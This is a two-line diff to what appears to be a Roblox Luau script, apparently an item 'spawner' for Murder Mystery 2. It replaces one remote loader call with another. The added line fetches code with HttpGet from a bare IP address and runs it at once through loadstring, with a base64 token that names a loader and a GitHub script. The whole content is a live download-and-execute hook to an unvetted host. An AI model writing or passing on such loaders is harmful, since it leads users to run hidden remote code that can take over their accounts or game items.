@@ -1,2 +1,1 @@
-ID="35a230f8-50cd-42b5-82d0-6b2256361c8e";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjMwMGMzMTgyLWUwMzUtNDhjNS1iNjM2LTRjZjI3MTE3Y2Y3NCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc3Bhd25lcnNjcmlwdC9NdXJkZXJNeXN0ZXJ5Mi9yZWZzL2hlYWRzL21haW4vQ2hyaXN0bWFzLmx1YSJ9fQ"))()
